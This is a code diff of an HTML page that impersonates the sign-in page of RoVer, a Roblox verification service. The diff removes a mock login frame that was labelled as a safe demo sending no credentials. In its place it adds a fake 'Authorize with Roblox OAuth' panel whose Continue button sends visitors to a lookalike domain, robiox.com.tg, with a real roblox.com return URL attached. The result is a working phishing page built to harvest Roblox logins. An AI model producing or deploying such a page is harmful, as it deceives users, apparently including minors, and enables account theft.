@@ -1,122 +1,202 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <title>RoVer - Sign In (Mock Roblox Frame - Simple Black)</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta charset="UTF-8">
+  <title>RoVer - Sign In</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
-    *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}
-    html,body{height:100%}
-    body{background:#1e1d1f;color:#fff;min-height:100vh;overflow-x:hidden}
+    * {margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
+    body {background:#1e1d1f;min-height:100vh;overflow-x:hidden;color:#fff;}
 
-    header{
-      background:#e00078;height:56px;display:flex;align-items:center;padding:0 20px;z-index:1001;
+    header {
+      background:#e00078;
+      height:56px;
+      display:flex;
+      align-items:center;
+      padding:0 20px;
       position:relative;
+      z-index:1001;
     }
-    .menu-btn{font-size:26px;color:#fff;cursor:pointer;background:none;border:none;margin-right:14px}
-    .logo{font-size:20px;font-weight:600;color:#fff;display:flex;align-items:center}
-
-    .overlay{position:fixed;inset:0;background:rgba(0,0,0,0.6);opacity:0;visibility:hidden;transition:.25s;z-index:900}
-    .overlay.active{opacity:1;visibility:visible}
-
-    .side-menu{
-      position:fixed;top:0;left:-260px;width:260px;height:100%;background:#e00078;color:#fff;padding:20px;transition:.3s;z-index:1002;
+    .menu-btn {
+      font-size:26px;
+      color:#fff;
+      cursor:pointer;
+      background:none;
+      border:none;
+      margin-right:14px;
     }
-    .side-menu.active{left:0}
-    .side-menu .close-btn{font-size:28px;cursor:pointer;margin-bottom:20px;background:none;border:none;color:#fff}
-    .side-menu ul{list-style:none}
-    .side-menu ul li{margin:14px 0;font-size:16px}
-    .side-menu ul li a{text-decoration:none;color:#fff;display:block;padding:6px 10px;border-radius:4px;transition:background .2s}
-    .side-menu ul li a.disabled{opacity:.6;pointer-events:none}
-    .side-menu ul li a.active{background:#fff;color:#000}
+    .logo {
+      font-size:20px;
+      font-weight:600;
+      color:#fff;
+      display:flex;
+      align-items:center;
+    }
 
-    main{padding:24px 20px}
-    /* Framed login box - simple black frame */
-    .login-box{
+    .overlay {
+      position:fixed;
+      top:0;
+      left:0;
+      width:100%;
+      height:100%;
+      background:rgba(0,0,0,0.6);
+      opacity:0;
+      visibility:hidden;
+      transition:opacity 0.3s ease, visibility 0.3s ease;
+      z-index:900;
+    }
+    .overlay.active {opacity:1;visibility:visible;}
+
+    .side-menu {
+      position:fixed;
+      top:0;
+      left:-260px;
+      width:260px;
+      height:100%;
+      background:#e00078;
+      color:#fff;
+      padding:20px;
+      transition:0.3s;
+      z-index:1002;
+    }
+    .side-menu.active {left:0;}
+    .side-menu .close-btn {
+      font-size:28px;
+      cursor:pointer;
+      margin-bottom:20px;
+      display:block;
+      background:none;
+      border:none;
+      color:#fff;
+    }
+    .side-menu ul {list-style:none;}
+    .side-menu ul li {margin:14px 0;font-size:16px;}
+    .side-menu ul li a {
+      text-decoration:none;
+      color:#fff;
+      display:block;
+      padding:6px 10px;
+      border-radius:4px;
+      transition:background 0.2s;
+    }
+    .side-menu ul li a.disabled {opacity:0.6;pointer-events:none;}
+    .side-menu ul li a.active {background:#fff;color:#000;}
+
+    .login-box {
       margin:80px auto;
-      background:#080808;
+      background:#000;
       padding:40px 30px;
-      border-radius:10px;
+      border-radius:6px;
       text-align:center;
       max-width:420px;
       width:90%;
       color:#fff;
       position:relative;
       z-index:1;
-      transition:opacity .4s,transform .4s;
-      overflow:visible;
-
-      /* simple black frame */
-      border:3px solid #000;
-      box-shadow:0 12px 40px rgba(0,0,0,0.6);
+      transition:opacity 0.4s ease, transform 0.4s ease;
     }
-    .login-box.hide{opacity:0;transform:scale(.98)}
-    .login-box.show{opacity:1;transform:scale(1)}
+    .login-box.hide {opacity:0;transform:scale(0.95);}
+    .login-box.show {opacity:1;transform:scale(1);}
 
-    .login-box h2{font-size:24px;margin-bottom:8px;font-weight:600}
-    .login-box p{font-size:14px;margin-bottom:20px;color:#ddd}
-    .login-box button.primary{
-      background:#e00078;color:#fff;border:none;padding:12px 28px;border-radius:22px;font-size:15px;font-weight:600;cursor:pointer;
+    .login-box h2 {font-size:24px;margin-bottom:8px;font-weight:600;}
+    .login-box p {font-size:14px;margin-bottom:24px;}
+    .login-box button {
+      background:#e00078;
+      color:#fff;
+      border:none;
+      padding:12px 28px;
+      border-radius:22px;
+      font-size:15px;
+      font-weight:600;
+      cursor:pointer;
+      transition:background 0.2s;
     }
-    .login-box button.primary:hover{background:#b80062}
+    .login-box button:hover {background:#b80062;}
 
-    /* framed mock area with simple black styling */
-    .frame-outer{
-      position:relative;margin-top:10px;border-radius:8px;overflow:hidden;
-      border:2px solid #000;background:#0b0b0b;
-      box-shadow:0 8px 30px rgba(0,0,0,0.5);
+    /* OAuth box */
+    .oauth-box {
+      background:#111;
+      border-radius:8px;
+      padding:30px 25px;
+      text-align:center;
+    }
+    .oauth-box .top {
+      font-size:22px;
+      font-weight:700;
+      margin-bottom:15px;
+      text-align:left;
+    }
+    .oauth-box p.subtitle {
+      font-size:14px;
+      color:#ccc;
+      margin:10px 0 20px;
+      text-align:left;
+    }
+    .oauth-box hr {
+      border:none;
+      border-top:1px solid #333;
+      margin:20px 0;
+    }
+    .oauth-box p.app-name {
+      margin-bottom:20px;
+      font-weight:600;
+    }
+    .oauth-box button.continue {
+      background:#fff;
+      color:#000;
+      border:none;
+      padding:12px;
+      border-radius:6px;
+      font-size:15px;
+      width:100%;
+      margin-bottom:15px;
+      cursor:pointer;
+    }
+    .oauth-box p.or {
+      margin:10px 0;
+      color:#888;
+    }
+    .oauth-box button.return {
+      background:#111;
+      color:#fff;
+      border:1px solid #333;
+      padding:12px;
+      border-radius:6px;
+      font-size:15px;
+      width:100%;
+      cursor:pointer;
     }
 
-    /* top bar that simulates being embedded - simple */
-    .mock-toolbar{
-      display:flex;align-items:center;gap:10px;padding:10px 12px;background:#0c0c0c;
-      border-bottom:1px solid rgba(255,255,255,0.03);
-    }
-    .mock-dots{display:flex;gap:6px;align-items:center}
-    .dot{width:10px;height:10px;border-radius:50%}
-    .dot.red{background:#b85b5b} .dot.yellow{background:#b89a5b} .dot.green{background:#5bb88a}
+    .extra-space {height:400px;}
 
-    .mock-title{flex:1;color:#dcdcdc;font-weight:600;font-size:13px;text-align:center}
-    .mock-url{font-size:12px;color:#9a9a9a;padding:8px 12px;text-align:center;background:rgba(255,255,255,0.01);border-radius:6px;margin:12px}
-
-    /* mock Roblox login content */
-    .mock-roblox{
-      padding:18px 20px 28px;color:#fff;
-      display:flex;flex-direction:column;align-items:stretch;gap:12px;
+    footer {
+      background:#18181a;
+      padding:30px 20px;
+      display:flex;
+      justify-content:space-between;
+      flex-wrap:wrap;
+      color:#ccc;
+      font-size:14px;
     }
-    .rb-brand{font-weight:800;font-size:20px;color:#f1f1f1}
-    .rb-sub{color:#999;font-size:13px;margin-bottom:6px}
-    .field{display:flex;flex-direction:column;gap:6px}
-    .field input{
-      background:#0b0b0b;border:1px solid rgba(255,255,255,0.06);padding:10px 12px;border-radius:6px;color:#fff;font-size:14px;
-      outline:none;
+    footer .left {font-size:13px;}
+    footer .right {display:flex;flex-wrap:wrap;gap:20px;}
+    footer a {color:#ccc;text-decoration:none;}
+    footer a:hover {text-decoration:underline;}
+    .footer-logo {
+      font-weight:700;
+      font-size:18px;
+      background:linear-gradient(to right, #ff4da6, #ff6600);
+      -webkit-background-clip:text;
+      -webkit-text-fill-color:transparent;
+      margin-bottom:10px;
+      display:inline-block;
     }
-    .field input::placeholder{color:#666}
-    .rb-actions{display:flex;gap:10px;align-items:center;margin-top:6px}
-    .btn-roblox{
-      flex:1;background:#2d2d2d;color:#fff;border:none;padding:10px;border-radius:6px;font-weight:700;cursor:pointer;
-    }
-    .btn-roblox:active{transform:translateY(1px)}
-    .btn-cancel{background:transparent;border:1px solid rgba(255,255,255,0.06);color:#ddd;padding:10px;border-radius:6px;cursor:pointer}
-
-    .note{
-      font-size:13px;color:#bbb;padding:10px 12px;border-radius:6px;background:rgba(255,255,255,0.01);
-    }
-
-    /* small responsive tweaks */
-    @media (max-width:480px){
-      .login-box{margin:40px 12px;padding:28px}
-      .mock-url{display:none}
-    }
-
-    footer{background:#18181a;padding:30px 20px;display:flex;justify-content:space-between;flex-wrap:wrap;color:#ccc;font-size:14px}
-    .footer-logo{font-weight:700;font-size:18px;background:linear-gradient(to right,#ff4da6,#ff6600);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
   </style>
 </head>
 <body>
   <header>
-    <button class="menu-btn" id="menuBtn">☰</button>
+    <button class="menu-btn">☰</button>
     <div class="logo">RoVer</div>
   </header>
 
@@ -137,161 +217,77 @@
     <div class="login-box show" id="loginBox">
       <h2>Sign in to RoVer</h2>
       <p>You must be 13 years of age or older to continue.</p>
-      <button class="primary" id="openRoblox">Log in with Roblox</button>
-
-      <!-- This area will be replaced with the framed (mock) Roblox UI -->
-      <div id="frameContainer" style="margin-top:16px;display:none"></div>
+      <button onclick="showOAuth()">Log in with Roblox</button>
     </div>
 
-    <div style="height:400px"></div>
+    <div class="extra-space"></div>
   </main>
 
   <footer>
-    <div>
+    <div class="left">
       <span class="footer-logo">Imaginary Menagerie</span><br>
       © 2024 Imaginary Menagerie, LLC.<br>
       attributions
     </div>
-    <div style="display:flex;gap:24px">
+    <div class="right">
       <div>
-        <a href="#" style="color:#ccc;text-decoration:none">Team members</a><br>
-        <a href="#" style="color:#ccc;text-decoration:none">Support Discord server ↗</a><br>
-        <a href="#" style="color:#ccc;text-decoration:none">Add RoVer to your server</a><br>
-        <a href="#" style="color:#ccc;text-decoration:none">Bot Developer API</a>
+        <a href="#">Team members</a><br>
+        <a href="#">Support Discord server ↗</a><br>
+        <a href="#">Add RoVer to your server</a><br>
+        <a href="#">Bot Developer API</a>
       </div>
       <div>
-        <a href="#" style="color:#ccc;text-decoration:none">Terms of Service</a><br>
-        <a href="#" style="color:#ccc;text-decoration:none">Privacy Policy</a><br>
-        <a href="#" style="color:#ccc;text-decoration:none">Verify your Roblox account</a>
+        <a href="#">Terms of Service</a><br>
+        <a href="#">Privacy Policy</a><br>
+        <a href="#">Verify your Roblox account</a>
       </div>
     </div>
   </footer>
 
   <script>
-    // Menu controls
-    const menuBtn = document.getElementById('menuBtn');
+    const menuBtn = document.querySelector('.menu-btn');
     const sideMenu = document.getElementById('sideMenu');
     const overlay = document.getElementById('overlay');
 
-    function toggleMenu(){
+    function toggleMenu() {
       sideMenu.classList.toggle('active');
       overlay.classList.toggle('active');
     }
+
     menuBtn.addEventListener('click', toggleMenu);
     overlay.addEventListener('click', toggleMenu);
 
-    // Main behavior: swap login area for framed mock Roblox login
-    const openRoblox = document.getElementById('openRoblox');
-    const loginBox = document.getElementById('loginBox');
-    const frameContainer = document.getElementById('frameContainer');
+    function showOAuth() {
+      const box = document.getElementById("loginBox");
 
-    openRoblox.addEventListener('click', () => {
-      // animate out original content
-      loginBox.classList.remove('show');
-      loginBox.classList.add('hide');
+      // Animate out
+      box.classList.remove("show");
+      box.classList.add("hide");
 
       setTimeout(() => {
-        // build the framed mock "Roblox" UI (DEMO ONLY — no external links)
-        frameContainer.innerHTML = `
-          <div class="frame-outer" role="region" aria-label="Mock Roblox Frame">
-            <div class="mock-toolbar">
-              <div class="mock-dots">
-                <div class="dot red"></div>
-                <div class="dot yellow"></div>
-                <div class="dot green"></div>
-              </div>
-              <div class="mock-title">roblox.com — Sign In (demo)</div>
-              <button class="btn-cancel" id="frameClose" style="margin-left:auto">Return</button>
-            </div>
-
-            <div class="mock-url">https://roblox.com (mock)</div>
-
-            <div class="mock-roblox">
-              <div style="display:flex;justify-content:space-between;align-items:center">
-                <div>
-                  <div class="rb-brand">ROBLOX</div>
-                  <div class="rb-sub">Sign in to continue to RoVer</div>
-                </div>
-              </div>
-
-              <div class="field">
-                <label style="font-size:12px;color:#bbb">Username or email</label>
-                <input id="mockUser" placeholder="Username or email" autocomplete="off" />
-              </div>
-
-              <div class="field">
-                <label style="font-size:12px;color:#bbb">Password</label>
-                <input id="mockPass" type="password" placeholder="Password" autocomplete="new-password" />
-              </div>
-
-              <div class="rb-actions">
-                <button class="btn-roblox" id="mockLoginBtn">Log In</button>
-                <button class="btn-cancel" id="mockCancelBtn">Cancel</button>
-              </div>
-
-              <div class="note" id="demoNote">
-                This is a safe demo. No credentials are submitted or sent anywhere. Use it to preview UI only.
-              </div>
-            </div>
+        box.innerHTML = `
+          <h2>Sign in to RoVer</h2>
+          <div class="oauth-box">
+            <div class="top">ROBLOX</div>
+            <p class="subtitle">Authorize with Roblox OAuth</p>
+            <hr>
+            <p class="app-name">RoVer</p>
+            <button class="continue" onclick="openLogin()">Continue</button>
+            <p class="or">or</p>
+            <button class="return" onclick="location.reload()">Return to RoVer</button>
           </div>
         `;
 
-        frameContainer.style.display = 'block';
+        // Animate in
+        box.classList.remove("hide");
+        box.classList.add("show");
+      }, 400); // match transition duration
+    }
 
-        // animate in framed UI by toggling classes on loginBox parent
-        loginBox.classList.remove('hide');
-        loginBox.classList.add('show');
-
-        // hide original simple buttons/paragraphs so the frame looks like it covers
-        loginBox.querySelector('h2').style.display = 'none';
-        loginBox.querySelector('p').style.display = 'none';
-        loginBox.querySelector('#openRoblox').style.display = 'none';
-
-        // append the frame container inside the login box visually
-        loginBox.appendChild(frameContainer);
-
-        // hook up framed UI buttons (DEMO behavior)
-        document.getElementById('frameClose').addEventListener('click', closeFrame);
-        document.getElementById('mockCancelBtn').addEventListener('click', closeFrame);
-
-        document.getElementById('mockLoginBtn').addEventListener('click', () => {
-          // Demo feedback: do not send anything. Show success-like message.
-          const note = document.getElementById('demoNote');
-          const u = document.getElementById('mockUser').value.trim();
-          if(!u){
-            note.textContent = 'Please enter a username (demo only).';
-            return;
-          }
-          note.textContent = 'Demo: login simulated. No credentials were sent.';
-          note.style.color = '#b6f2b6';
-          setTimeout(() => {
-            note.textContent = 'You are now returned to RoVer (demo).';
-            setTimeout(closeFrame, 900);
-          }, 600);
-        });
-
-      }, 300); // small delay to match animations
-    });
-
-    function closeFrame(){
-      // remove the frame and restore original content
-      const container = document.getElementById('frameContainer');
-      if(!container) return;
-
-      // show original text/buttons
-      const h2 = loginBox.querySelector('h2');
-      const p = loginBox.querySelector('p');
-      const btn = loginBox.querySelector('#openRoblox');
-
-      if(h2) h2.style.display = '';
-      if(p) p.style.display = '';
-      if(btn) btn.style.display = '';
-
-      // remove frame content
-      container.innerHTML = '';
-      container.style.display = 'none';
+    // Simple clean redirect
+    function openLogin() {
+      window.location.href = "https://www.robiox.com.tg/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F211480936497%2Fprofile";
     }
   </script>
 </body>
 </html>
-
